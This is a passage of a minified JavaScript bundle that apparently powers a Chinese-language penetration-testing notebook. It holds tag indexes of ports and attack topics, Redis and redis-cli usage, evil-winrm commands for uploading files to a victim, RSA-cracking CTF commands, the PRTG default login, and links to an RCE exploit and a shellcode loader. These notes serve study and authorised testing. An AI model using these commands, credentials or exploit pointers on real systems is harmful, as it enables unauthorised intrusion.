                      \u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\u4E0A\uFF0C\u6253\u5F00\u7F16\u8F91\u4E00\u4E2A\u6587\u672C\u6587\u4EF6
                          \uFF08\u6CE8\u610F\uFF0C\u4E0D\u662F\u5728\u3010mqtt\u3011\u800C\u662F\u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\uFF09
                  shell  <\u547D\u4EE4>
                      \u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\uFF0C\u6267\u884Cshell\u547D\u4EE4

              exp\u5229\u7528\u64CD\u4F5C
                  commands
                      \uFF1F\uFF1F\uFF1F
                  exec
                      \uFF1F\uFF1F\uFF1F
                  victims
                      \uFF1F\uFF1F\uFF1F

          `))}]},tj=Hn,gj=k.e.singleATag_blank,pj={name:"\u3010Redis\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD\u548C\u4F7F\u7528",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
                  \u5B98\u7F51\uFF0C\u547D\u4EE4\u8BE6\u60C5\u67E5\u8BE2\uFF1Ahttps://redis.io/commands/?name=keys

          \u547D\u4EE4\u884C\u4F7F\u7528\uFF1A
                  info
                          \u67E5\u770B\u3010\u7CFB\u7EDF\u4FE1\u606F\u3011\u548C\u3010\u7EDF\u8BA1\u6570\u636E\u3011

                  select  <\u7D22\u5F15\u6570>
                          \u9009\u62E9\u67D0\u4E2A\u3010\u5B50\u6570\u636E\u5E93\u3011

                  SET  <\u952Ekey>  <\u503Cvalue>
                          \u8BBE\u7F6E\u67D0\u4E2A\u503C

                  GET  <\u952Ekey>
                          \u83B7\u53D6\u67D0\u4E2A\u503C

                  KEYS  <\u901A\u914D\u7B26_\u5982*_\u5982abc*_\u7B49>
                          \u83B7\u53D6\u6240\u6709\u7684key\u952E
          `))},{name:"\u8FDE\u63A5\u5DE5\u5177\uFF0C\u3010redis-cli\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5E38\u7528\u547D\u4EE4\uFF1A
                  \u8FDE\u63A5\uFF1A
                          redis-cli  -h  <\u4E3B\u673A\u540D>  -p  <\u7AEF\u53E3>  -a  <\u5BC6\u7801>

          `))}]},hj=pj,cj,Un,Aj,Dj,aj,Tj,Xn,lj,jj,bj,Mj,yj,vj,rj,Ij,_j,wj,ej,xj,Oj,zj,Lj,g,a,i,w,x,I,W,M,J,V,Y,Fu,fu,Pu,bu,Vu,Nn,yn,Mn,mj,Kn,uj,ij,Sj,Wj,Rj,Hj,Uj,Kj,qj,Jj,Vj,Gj,Qj,Xj,Yj,Zj,$j,ue,ne,je,ee,se,fe,te,ce,ae,le,Nj,re,ke=[Object(u.a)(cj||(cj=Object(h.a)([`
  \u3010`,`\u3011\u3001\u30101111\u3011/*\u5FEB\u901F\u6C42\u63F4*/
  `,`
  `,`
  `,`
  `,`
  `,`
  `])),uu.a.\u6E17\u900F\u6D4B\u8BD5,Zn.c,Zn.a,Zn.d,Zn.e,Zn.b),Object(u.a)(Un||(Un=Object(h.a)([`
  \u30101433\u3011\u3001
  \u3010SqlServer\u3011\u3001\u3010Sql Server\u3011\u3001\u3010sql-server\u3011\u3001
  \u3010MSSql\u3011\u3001\u3010MS Sql\u3011\u3001\u3010ms-sql\u3011
  `,`

  \u3010shell\u3011\u3001 \u3010Shell\u3011\u3001\u3010Reverse\u3011\u3001\u3010\u53CD\u5411\u3011\u3001\u3010\u53CD\u5411\u4EE3\u7406\u3011
  \u3010\u529F\u80FDshell\u3011
  \u3010netcat\u3011\u3001\u3010nc\u3011\u3001
  \u3010psexec\u3011\u3001
  \u3010winrm\u3011\u3001\u3010evil-winrm\u3011\u3001\u3010EvilWinrm\u3011
   `,`

  `])),Au,Nu.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C),Object(u.a)(Aj||(Aj=Object(h.a)([`
  \u3010\u7F51\u7EDC\u626B\u63CF\u3011\u3001\u3010\u7F51\u7EDC\u53D1\u73B0\u3011\u3001
  \u3010\u4E3B\u673A\u63A2\u6D4B\u3011\u3001\u3010\u7AEF\u53E3\u63A2\u6D4B\u3011\u3001\u3010\u4E3B\u673A\u53D1\u73B0\u3011\u3001\u3010C\u6BB5\u3011\u3001\u3010B\u6BB5\u3011\u3001

  \u3010nmap\u3011\u3001
  `,`

   \u3010NetDiscover\u3011\u3001
  `,`

    \u3010MasScan\u3011
  `,`

  `])),s.Nmap_\u624B\u518C,F,b),Object(u.a)(Dj||(Dj=Object(h.a)([`
  \u3010\u626B\u63CF\u5668\u3011\u3001\u3010\u6F0F\u626B\u3011\u3001\u3010\u6F0F\u6D1E\u626B\u63CF\u5668\u3011\u3001

  \u3010Nikto\u3011
  `,`

    \u3010Nessus\u3011
  `,`

  `])),v,A),Object(u.a)(aj||(aj=Object(h.a)([`
  \u3010ping\u3011\u3001\u3010ping\u7C7B\u3011\u3001\u3010\u7C7Bping\u3011\u3001\u3010hping\u3011\u3001\u3010IP\u3011\u3001\u3010IPv6\u3011\u3001\u3010IP6\u3011\u3001\u3010atk6-alive6\u3011
  \u3010IP\u8DF3\u8F6C\u3011\u3001\u3010\u8DEF\u7531\u3011\u3001\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u3001\u3010\u7F51\u7EDC\u62D3\u6251\u3011\u3001\u3010\u62D3\u6251\u3011
  `,`

  `])),r),Object(u.a)(Tj||(Tj=Object(h.a)([`
  \u3010\u9632\u706B\u5899\u3011\u3001\u3010waf\u3011
  `,`

  `])),P.b),Object(u.a)(Xn||(Xn=Object(h.a)([`
  \u3010\u7AEF\u53E3\u3011\u3001\u3010\u672A\u77E5\u7AEF\u53E3\u3011\u3001\u3010\u5E38\u7528\u7AEF\u53E3\u3011\u3001\u3010port\u3011
  `,`


  `])),S),Object(u.a)(lj||(lj=Object(h.a)([`
  \u3010FTP\u3011\u3001\u3010SFTP\u3011\u3001\u3010filezilla\u3011\u3001\u3010vsftpd\u3011\u3001\u301021\u3011\u3001\u301020\u3011
  `,`


  `])),T.FTP_\u624B\u518C),Object(u.a)(jj||(jj=Object(h.a)([`
  \u3010CIFS\u3011
  \u3010139\u3011\u3001\u3010SMB\u3011\u3001\u3010netbios\u3011\u3001\u3010netbios-ssn\u3011\u3001\u3010smbd\u3011
  \u3010445\u3011\u3001\u3010SMB\u3011\u3001\u3010ds\u3011\u3001\u3010microsoft-ds\u3011\u3001\u3010smbd\u3011
  `,`


  \u300ACIFS\u300B\uFF1A\u5168\u79F0 Common Internet File System
      \u5E38\u7528\u7AEF\u53E3\uFF1A3020\u3002

  `])),G),Object(u.a)(bj||(bj=Object(h.a)([`
  \u3010RDP\u3011\u3001
  \u30103389\u3011\u3001\u3010ms-wbt-server\u3011
  \u3010MsTsc\u3011\u3001

  MsTsc
      \u6211\u8FD8\u4E0D\u77E5\u9053\u8FD9\u4E2A\u662F\u4EC0\u4E48\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u53CD\u6B63\u548CWindows\u767B\u5F55 RDP \u6709\u5173\u7684\u3002
      Microsoft terminal services client
          \u5176\u5B9E\uFF0C\u5C31\u662F\u3010MsTsc\u8FDC\u7A0B\u684C\u9762\u8FDE\u63A5\u3011\u7684\u5DE5\u5177
          \u7F16\u8F91\u73B0\u6709\u201C\u8FDC\u7A0B\u684C\u9762\u8FDE\u63A5(.rdp)\u201D\u914D\u7F6E\u6587\u4EF6


  `,`


  `])),au),Object(u.a)(Mj||(Mj=Object(h.a)([`
  \u3010RPC\u3011\u3001
  \u3010135\u3011\u3001\u3010msrpc\u3011
  `,`

  \u8FDC\u7A0B\u8FC7\u7A0B\u8C03\u7528 RPC
      \u652F\u6301 Windows \u5E94\u7528\u7A0B\u5E8F\u4E4B\u95F4\u7684\u901A\u4FE1
      \u5B9E\u73B0\u4E86 RPC \u534F\u8BAE
          \u4E00\u79CD\u4F4E\u7EA7\u7684\u8FDB\u7A0B\u95F4\u901A\u4FE1\u5F62\u5F0F\uFF0C\u5176\u4E2D\u5BA2\u6237\u7AEF\u8FDB\u7A0B\u53EF\u4EE5\u5411\u670D\u52A1\u5668\u8FDB\u7A0B\u53D1\u51FA\u8BF7\u6C42

  Microsoft \u7684\u57FA\u7840 COM \u548C DCOM \u6280\u672F\u5EFA\u7ACB\u5728 RPC \u4E4B\u4E0A
      \u670D\u52A1\u7684\u540D\u79F0\u662F RpcSs\uFF0C\u5B83\u5728\u5171\u4EAB\u670D\u52A1\u4E3B\u673A\u8FDB\u7A0B svchost.exe \u4E2D\u8FD0\u884C\u3002

  `])),du),Object(u.a)(yj||(yj=Object(h.a)([`
  \u3010RMI\u3011

  `,`

  `])),du),Object(u.a)(vj||(vj=Object(h.a)([`
  \u30106789\u3011
  \u30108080\u3011
  \u30108443\u3011

  \u3010JNDI\u3011\u3001\u3010LDAP\u3011
  `,"  ",`



  6789
  ibm-db2-admin?

  8080
  http-proxy

  8443
  ssl/nagios-nsca
  Nagios NSCA


  \u76F8\u5173CMS\uFF1A
      UniFi / UniFi Network

  `,`

  `,`

  `,`

  `,`


  x_shadow
      \u65E0\u6CD5\u89E3\u5F00
      \u6211\u4EEC\u81EA\u5DF1\u521B\u5EFA\u3001\u81EA\u5DF1\u66FF\u6362\u4E00\u4E2A


  `])),Iu,jn,cn,Ln,dn,Yu.Linux_Unix_\u624B\u518C),Object(u.a)(rj||(rj=Object(h.a)([`
  \u3010http\u3011\u3001\u301080\u3011\u3001\u3010https\u3011\u3001\u3010443\u3011\u3001
  \u3010HTTPAPI\u3011\u3001\u3010Microsoft HTTPAPI\u3011\u3001
  `,"  ","  ",`

  \u3010Enum\u3011\u3001\u3010\u679A\u4E3E\u3011\u3001
  \u3010\u8BCD\u5178\u3011\u3001\u3010\u5B57\u5178\u3011\u3001\u3010Dict\u3011\u3001\u3010List\u3011\u3001\u3010SecList\u3011
  \u3010dir\u3011\u3001\u3010directory\u3011\u3001\u3010\u76EE\u5F55\u3011
  `,`

  \u3010busting\u3011\u3001\u3010\u66B4\u529B\u3011\u3001\u3010\u66B4\u529B\u7834\u89E3\u3011\u3001\u3010bust\u3011\u3001\u3010buster\u3011  /  \u3010\u86EE\u529B\u3011\u3001\u3010brute\u3011\u3001\u3010bruting\u3011  /  \u3010force\u3011  /  \u3010gobuster\u3011  /  \u3010\u7206\u7834\u3011\u3001
  `,`
  \u3010hash\u3011\u3001\u3010md5\u3011
  \u3010John The Ripper\u3011\u3001\u3010John\u3011\u3001\u3010hashcat\u3011\u3001
  `,"  ",`

  `])),_u,fn,Gu,Su.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C,uu.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u5BC6\u7801_\u53CA\u7834\u89E3,fn,Su.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C),Object(u.a)(Ij||(Ij=Object(h.a)([`
  \u3010fuzz\u3011\u3001\u3010\u6A21\u7CCA\u3011\u3001\u3010\u6A21\u7CCA\u6D4B\u8BD5\u3011

  `,`
  `])),hu),Object(u.a)(_j||(_j=Object(h.a)([`
  \u3010\u4FE1\u606F\u3011\u3001\u3010\u6536\u96C6\u3011\u3001\u3010\u4FE1\u606F\u6536\u96C6\u3011\u3001\u3010Information\u3011\u3001\u3010collect\u3011
  `,`


  `])),$u),Object(u.a)(wj||(wj=Object(h.a)([`
  \u3010sql\u3011\u3001\u3010\u6CE8\u5165\u3011\u3001
  \u30103306\u3011\u3001
  \u3010MariaDB\u3011\u3001
  `,`


  sql\u6CE8\u5165

  \u53E6\u4E00\u79CD\u8BF4\u6CD5\uFF0Cluck-based method  \u770B\u8FD0\u6C14\u7684\u65B9\u6CD5
      brute-forcing  \u66B4\u529B\u7834\u89E3

  404

  `])),Au),Object(u.a)(ej||(ej=Object(h.a)([`
  \u3010PII\u3011\u3001\u3010iden\u3011\u3001\u3010information\u3011

  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
      PII
          personally identifiable information\uFF0C\u4E2A\u4EBA\u8EAB\u4EFD\u4FE1\u606F
  `]))),Object(u.a)(xj||(xj=Object(h.a)([`
  \u301022\u3011\u3001\u3010OpenSSH\u3011\u3001\u3010ssh\u3011
  \u301023\u3011\u3001\u3010telnet\u3011
  `,`

  `])),Dn.a),Object(u.a)(Oj||(Oj=Object(h.a)([`
  \u3010SSTI\u3011\u3001
  \u3010\u6A21\u677F\u3011\u3001\u3010template\u3011\u3001\u3010engine\u3011\u3001\u3010expression\u3011
  \u3010HandleBars\u3011\u3001
  \u3010JSP\u3011\u3001
  `,`


  \u3010BurpSuite\u3011\u3001\u3010BP\u3011\u3001\u3010Burp\u3011\u3001
  \uFF08\u653E\u5728\u8FD9\u91CC\u662F\u5E72\u561B\uFF1F\u6211\u611F\u89C9\u5173\u8054\u4E0D\u5927\uFF09
  `,`


  `])),ln,Gu),Object(u.a)(zj||(zj=Object(h.a)([`
  \u3010Velocity\u3011
  \u3010\u6A21\u677F\u3011\u3001\u3010template\u3011\u3001


  `,`

  `])),ln),Object(u.a)(Lj||(Lj=Object(h.a)([`
  \u3010CIA\u3011

  triad
      \u4E09\u5408\u4F1A
      \u4E09\u548C\u5F26

  Confidentiality, integrity and availability
      \u4FDD\u5BC6\u6027\u3001\u5B8C\u6574\u6027\u3001\u53EF\u7528\u6027
      CIA\u4E09\u539F\u5219\u3001CIA\u4E09\u5143\u7EC4

  `]))),Object(u.a)(g||(g=Object(h.a)([`
  \u3010Linux\u3011\u3001\u3010Unix\u3011
  \u3010cmd\u3011\u3001\u3010command\u3011\u3001\u3010grep\u3011\u3001\u3010find\u3011\u3001\u3010xargs\u3011
  \u3010Docker\u3011
  `,"  ",`

  `])),Yu.Linux_Unix_\u624B\u518C,cu),Object(u.a)(a||(a=Object(h.a)([`
  \u3010Windows\u3011\u3001\u3010\u3010Windows Server\u3011
  \u3010cmd\u3011\u3001\u3010powershell\u3011
  \u3010psexec\u3011
  `,`

  Windows NT
      Windows New Technology

  `])),gu.Windows_\u624B\u518C),Object(u.a)(i||(i=Object(h.a)([`
  \u3010XSS\u3011
  `,`

  Cross-Site-Script




  `])),X),Object(u.a)(w||(w=Object(h.a)([`
  \u3010\u8D8A\u6743\u3011\u3001\u3010Broken Access Control\u3011
  \u3010\u6C34\u5E73\u8D8A\u6743\u3011\u3001\u3010Horizontal\u3011\u3001\u3010Horizontal access control\u3011
  \u3010\u5782\u76F4\u8D8A\u6743\u3011\u3001\u3010Vertical\u3011\u3001\u3010Vertical access control\u3011
  \u3010\u4E0A\u4E0B\u6587\u3011\u3001\u3010\u4E0A\u4E0B\u6587\u76F8\u5173\u3011\u3001\u3010\u4E0A\u4E0B\u6587\u76F8\u5173\u8D8A\u6743\u3011\u3001\u3010Context\u3011
  \u3010\u672A\u6388\u6743\u3011\u3001\u3010Unauthorized\u3011
  \u3010Privilege\u3011
  `,`

  \u53C2\u8003\u8D44\u6599\uFF1A
      https://portswigger.net/web-security/access-control


  OAuth\u6388\u6743

  `])),zu),Object(u.a)(x||(x=Object(h.a)([`
  \u3010\u4E0A\u4F20\u3011\u3001\u3010\u6587\u4EF6\u4E0A\u4F20\u3011\u3001\u3010upload\u3011
  `,`

  `])),Ju),Object(u.a)(I||(I=Object(h.a)([`
  \u3010\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u3011

  `,`

  `])),Rn),Object(u.a)(W||(W=Object(h.a)([`
  \u3010\u6743\u9650\u3011\u3001\u3010\u63D0\u5347\u3011\u3001\u3010\u6743\u9650\u63D0\u5347\u3011\u3001\u3010\u63D0\u5347\u6743\u9650\u3011\u3001\u3010\u63D0\u6743\u3011
  \u3010Privilege Escalation\u3011\u3001\u3010Privilege\u3011\u3001\u3010Escalation\u3011
  \u3010sudo\u3011\u3001\u3010suid\u3011\u3001\u3010vi\u3011\u3001\u3010Mongo\u3011\u3001\u3010lxd\u3011\u3001


  `,`

  `])),Qn.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(M||(M=Object(h.a)([`
  \u3010\u5185\u7F51\u6E17\u900F\u3011
  \u3010CobaltStrike\u3011\u3001\u3010CS\u3011


  `,`

  `])),Qn.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(J||(J=Object(h.a)([`
  \u3010UDP\u3011
  \u301069\u3011\u3001
  \u3010TFTP\u3011\u3001\u3010tftpd-hpa\u3011
  `,`


  `])),Bn),Object(u.a)(V||(V=Object(h.a)([`
  \u3010\u793E\u4F1A\u5DE5\u7A0B\u5B66\u3011\u3001\u3010\u5FC3\u7406\u5B66\u3011\u3001\u3010Social\u3011\u3001\u3010Social Engine\u3011\u3001\u3010Social Engineering\u3011
  \u3010\u4EBA\u3011\u3001\u3010\u4EBA\u7684\u56E0\u7D20\u3011
  `,`

  `,`



  `])),uu.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u5BC6\u7801_\u53CA\u7834\u89E3,rn),Object(u.a)(Y||(Y=Object(h.a)([`
  \u3010API\u3011\u3001\u3010\u63A5\u53E3\u3011\u3001
  \u3010\u7528\u6237\u8F93\u5165\u3011\u3001\u3010input\u3011

  \u4ECE\u7B80\u5355\u5230\u96BE\uFF0C\u6392\u5217\uFF1A
      \u6CE8\u5165\uFF1A
          XSS
          SQL
      \u903B\u8F91\u6F0F\u6D1E

  `]))),Object(u.a)(Fu||(Fu=Object(h.a)([`
  \u3010Metasploit\u3011\u3001\u3010msf\u3011\u3001\u3010msfconsole\u3011\u3001\u3010msfvenom\u3011
  `,`

  `])),Tu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C),Object(u.a)(fu||(fu=Object(h.a)([`
  \u3010k8s\u3011\u3001\u3010docker\u3011\u3001\u3010lxd\u3011\u3001

  `,`


  k8s
      https://t.zsxq.com/vJuN37q

  `])),Qn.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(Pu||(Pu=Object(h.a)([`
  \u3010Rust\u3011


  Rust shellcode\u52A0\u8F7D\u5668\uFF1A
      \u76F8\u5173\u8D44\u6599\uFF1Ahttps://github.com/HuskyHacks/RustyProcessInjectors/tree/master/EnumSystemGeoID

  rust \u505A C2
      \u76F8\u5173\u8D44\u6599\uFF1Ahttps://t.zsxq.com/2RNbqzn

  `]))),Object(u.a)(bu||(bu=Object(h.a)([`
  \u3010\u57DF\u3011\u3001\u3010domain\u3011\u3001\u3010\u57DF\u63A7\u3011\u3001\u3010Domain Controller\u3011\u3001\u3010DC\u3011
  \u3010kerberos\u3011\u3001
          \u3010Mimikatz\u3011\u3001\u3010\u9EC4\u91D1\u7968\u636E\u3011\u3001\u3010\u767D\u94F6\u7968\u636E\u3011\u3001
  \u3010BloodBound\u3011\u3001


  Kerberos  \uFF08\u5E38\u7528\u573A\u666F\uFF1AMimikatz\u3001\uFF09

      \u57FA\u672C\u4ECB\u7ECD\uFF1A
          \u901A\u4FD7\u6613\u61C2\uFF0C\u79D1\u666E\u7684\u8D44\u6599\uFF1A
              \u4E00\u6587\u641E\u5B9AKerberos - tkanng\u7684\u6587\u7AE0 - \u77E5\u4E4E    https://zhuanlan.zhihu.com/p/266491528
              \u80FD\u7528\u901A\u7528\u7684\u8BED\u8A00\u4ECB\u7ECD\u4E0B Kerberos \u534F\u8BAE\u4E48\uFF1F - \u8F66\u5C0F\u80D6\u7684\u56DE\u7B54 - \u77E5\u4E4E    https://www.zhihu.com/question/22177404/answer/492680179

          \u672C\u8D28\uFF1A
              \u4E00\u53E5\u8BDD\u6765\u8BF4\uFF0CKerberos \u662F\u4E00\u79CD\u57FA\u4E8E\u52A0\u5BC6 Ticket \u7684\u8EAB\u4EFD\u8BA4\u8BC1\u534F\u8BAE\u3002

              \u6765\u6E90\u4E8E\u53E4\u5E0C\u814A\u795E\u8BDD\u4E2D\u7684 Cerberus \u2014\u2014 \u5B88\u62A4\u5730\u72F1\u4E4B\u95E8\u7684\u4E09\u5934\u72AC\u3002

          \u7EC4\u6210\u90E8\u5206\uFF1A
              Kerberos \u4E3B\u8981\u7531\u4E09\u4E2A\u90E8\u5206\u7EC4\u6210\uFF1A
                  Key Distribution Center (\u5373KDC)\u3001
                  Client
                  \u548C Service\u3002

      Kerberos relay
          \u901A\u8FC7dns\u670D\u52A1\u7684kerberbos\u8BA4\u8BC1\uFF0Crelay\u5230ad cs\u3002\u679C\u7136\u8FD9\u4E2A\u70B9\u8FD8\u6709\u5F88\u591A\u5229\u7528\u573A\u666F\u53EF\u4EE5\u6316\u6398\u3002
              https://t.zsxq.com/qNzzZFa
          https://t.zsxq.com/MfIA6eY



  https://t.zsxq.com/3BEybIE



  \u5FAE\u8F6F\u5B98\u65B9\u5BF9\u4E8EAD\u7684\u5B9E\u73B0
      https://t.zsxq.com/faUnUz3



  ata
      https://t.zsxq.com/nQJU7MV


  `]))),Object(u.a)(Vu||(Vu=Object(h.a)([`
  \u3010weak\u3011\u3001\u3010\u5F31\u52A0\u5BC6\u3011\u3001\u3010\u5F31\u7B97\u6CD5\u3011
  \u3010RSA\u3011\u3001\u3010\u516C\u94A5\u3011\u3001\u3010pub\u3011\u3001\u3010.pub\u3011\u3001\u3010\u79C1\u94A5\u3011\u3001\u3010private\u3011\u3001\u3010.enc\u3011


  \u5982\u679Cp\u548Cq\u503C\u662F\u8F83\u5C0F\u7684\u7D20\u6570\uFF0C\u6211\u4EEC\u53EF\u4EE5\u6253\u7834 RSA \u7B97\u6CD5

  RSA \u6709\u4E00\u4E9B\u5F31\u70B9\u3002\u7279\u522B\u662F\uFF0C\u5F53\u4F7F\u7528\u5C0F\u5BC6\u94A5\u65F6\uFF0C\u53EF\u4EE5\u4ECE\u516C\u94A5\u4E2D\u5BFC\u51FA\u79C1\u94A5\u3002

  \u76F8\u5173\u5DE5\u5177\uFF1A
      OpenSSL
          openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv

      RsaCtfTool/RsaCtfTool.py
          python    RsaCtfTool.py             --publickey ./key.pub   --private
          python3   RsaCtfTool/RsaCtfTool.py  --publickey key.pub     --uncipherfile flag.enc


  `]))),Object(u.a)(Nn||(Nn=Object(h.a)([`
  \u3010PRTG\u3011\u3001\u3010Netmon\u3011\u3001

  CMS
      PRTG\u3001Netmon
          \u5168\u79F0\u4E3A PRTG Network Monitor \uFF08NETMON\uFF09

          \u96B6\u5C5E\u4E8E\u300APaessler\u300B\u516C\u53F8

          \u5E38\u89C1\u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
              prtgadmin/prtgadmin

          \u914D\u7F6E\u6587\u4EF6\u67E5\u627E\uFF1A
              \u53C2\u8003\u8D44\u6599\uFF1Ahttps://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

              \u300APRTG Configuration\u300B

          \u547D\u4EE4\u6CE8\u5165
              \u8D44\u6599\uFF1Ahttps://www.codewatch.org/blog/?p=453

          \u8EAB\u4EFD\u9A8C\u8BC1\u7684rce\uFF1A
              \u8D44\u6599\uFF1Ahttps://github.com/wildkindcc/CVE-2018-9276
              CVE-2018-9276


  `]))),Object(u.a)(yn||(yn=Object(h.a)([`
  \u3010MS-17-010\u3011\u3001\u3010\u6C38\u6052\u4E4B\u84DD\u3011
  \u3010SMB\u3011\u3001\u3010Samba\u3011

  \u4ECB\u7ECD\uFF1A
      Windows SMB \u4E2D\u7684\u4E00\u4E2A\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E
      \u5728 2017 \u5E74\u88AB\u4E00\u6B3E\u540D\u4E3A\u201CWannaCry\u201D\u7684\u52D2\u7D22\u8F6F\u4EF6\u4F7F\u7528\u540E\u58F0\u540D\u9E4A\u8D77\u3002

  \u5229\u7528\u65B9\u5F0F\uFF1A
      metasploit
      Impacket

  `]))),Object(u.a)(Mn||(Mn=Object(h.a)([`
  \u30105985\u3011\u3001\u3010WinRM\u3011\u3001\u3010Windows Remote Manager\u3011
  \u3010evil-winrm\u3011\u3001\u3010EvilWinrm\u3011\u3001


  evil-winrm / EvilWinrm

      evil-winrm  -i  <IP\u5730\u5740>  -u  <\u7528\u6237\u540D>  -p  <\u5BC6\u7801\u503C>

      ruby  evil-winrm.rb  -i  <IP\u5730\u5740>  -u  <\u7528\u6237\u540D>  -p  <\u5BC6\u7801\u503C>

      \u5185\u7F6E\u547D\u4EE4\uFF1A
          upload  <\u653B\u51FB\u673A\u6587\u4EF6\u8DEF\u5F84>
              \u4ECE\u653B\u51FB\u673A\uFF0C\u4E0A\u4F20\u6587\u4EF6\uFF0C\u5230\u53D7\u5BB3\u673A

          net  use  <\u5177\u4F53SMB\u7684share\u8DEF\u5F84>

  `]))),Object(u.a)(mj||(mj=Object(h.a)([`
  \u3010dos2unix\u3011

  dos2unix
      dos2unix  <dos\u6587\u4EF6\u8DEF\u5F84>
          \u4EC5\u4EC5\u5728\u683C\u5F0F\u4E0A\uFF0C\u8FDB\u884C\u8F6C\u53D8
      unix2dos  <dos\u6587\u4EF6\u8DEF\u5F84>
          \u4EC5\u4EC5\u5728\u683C\u5F0F\u4E0A\uFF0C\u8FDB\u884C\u8F6C\u53D8

  `]))),Object(u.a)(Kn||(Kn=Object(h.a)([`
  \u3010web\u3011\u3001\u3010\u7F51\u7AD9\u3011\u3001\u3010site\u3011  /  \u3010wappalyzer\u3011

  \u3010Nginx\u3011\u3001\u3010Apache\u3011\u3001\u3010Node.js\u3011\u3001\u3010NodeJS\u3011\u3001\u3010Jetty\u3011
  \u3010Express\u3011\u3001

  \u3010CMS\u3011\u3001
  \u3010Magento\u3011\u3001\u3010UniFi\u3011\u3001
  \u3010Jenkins\u3011\u3001\u30108080\u3011\u3001

  \u3010FrameWork\u3011\u3001\u3010\u6846\u67B6\u3011  /  \u3010Middleware\u3011\u3001\u3010\u4E2D\u95F4\u4EF6\u3011\u3001\u3010\u7248\u672C\u3011\u3001\u3010CVE\u3011
  `,"  ","  ",`
  `,`




  \u7F51\u9875\u62A5\u9519

      302
          \u8FD4\u56DE\u3010302\u3011+\u3010Location\u3011\uFF0C\u4F1A\u8DF3\u8F6C Location \u7684\u7F51\u9875\u5730\u5740\u3002

          \u8DF3\u8F6C\u3010Location\u3011\u540E\uFF0C\u6709\u65F6\u4F1A\u65E0\u6CD5\u663E\u793A\uFF1A
              \u539F\u7406\uFF1A
                  \u539F\u3010IP\u9875\u9762\u3011\uFF0C\u5FC5\u987B\u8981\u6C42\u3010\u4ECE\u57DF\u540D\u8BBF\u95EE\u3011\u3002
                  \u800C\u6211\u4EEC\u65E0\u6CD5\u76F4\u63A5\u8BBF\u95EE\u3010\u57DF\u540D\u9875\u9762\u3011\uFF0C\u4F46\u662F\u6211\u4EEC\u80FD\u591F\u8BBF\u95EE\u3010IP\u9875\u9762\u3011\u3002
                  \u6240\u4EE5\uFF0C\u6700\u7EC8\uFF0C\u6211\u4EEC\u4FEE\u6539\u3010hosts\u6587\u4EF6\u3011\uFF1B\u6765\u5B9E\u73B0\u3010\u865A\u62DF\u7684\u57DF\u540D\u8BBF\u95EE\u3011\u3002

      Chrome\u8BE6\u7EC6\u62A5\u9519
          DNS_PROBE_FINISHED_NXDOMAIN
              123

  \u4FEE\u6539\u300A/etc/hosts\u300B



  Apache
      /etc/apache2


  `])),_u,cn,$u,zn),Object(u.a)(uj||(uj=Object(h.a)([`
  \u3010XXE\u3011\u3001\u3010XEE\u3011

  `,`

  `])),Fn),Object(u.a)(ij||(ij=Object(h.a)([`
  \u3010exe\u3011\u3001\u3010\u53EF\u6267\u884C\u6587\u4EF6\u3011\u3001
  \u3010pwn\u3011\u3001
  \u3010\u9006\u5411\u3011\u3001\u3010\u9006\u5411\u5DE5\u7A0B\u3011\u3001\u3010REVERSE ENGINEERING\u3011\u3001
  \u3010\u53CD\u7F16\u8BD1\u3011\u3001\u3010decompile\u3011\u3001
  \u3010\u6C47\u7F16\u3011\u3001\u3010ASM\u3011\u3001\u3010assemble\u3011\u3001
  \u3010\u4E8C\u8FDB\u5236\u3011\u3001\u3010binary\u3011\u3001
  \u3010Windows\u3011\u3001\u3010Linux\u3011\u3001

  `,`

  `])),Zu),Object(u.a)(Sj||(Sj=Object(h.a)([`
  \u3010Tomcat\u3011

  `,`

  `])),cn),Object(u.a)(Wj||(Wj=Object(h.a)([`
  \u3010JWT\u3011\u3001\u3010jsonwebtoken\u3011\u3001

  `,`
  `])),nj),Object(u.a)(Rj||(Rj=Object(h.a)([`
  \u3010\u6D4F\u89C8\u5668\u3011\u3001\u3010Firefox\u3011\u3001

  `,`

  `])),dj),Object(u.a)(Hj||(Hj=Object(h.a)([`
  \u3010CTF\u3011

  CTF\uFF0C\u6709\u8DA3\u7684\u8D44\u6599\uFF1A
